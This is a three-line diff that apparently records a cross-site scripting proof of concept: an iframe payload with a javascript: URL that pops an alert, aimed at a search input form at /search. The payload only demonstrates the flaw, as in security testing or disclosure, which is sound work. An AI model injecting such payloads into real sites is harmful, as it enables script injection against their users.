@@ -1,0 +1,3 @@
+Payload: <iframe src="javascript:alert(`POC: XSS | Hello World`)">
+Attack Vector: Search Input Form
+URL: /search
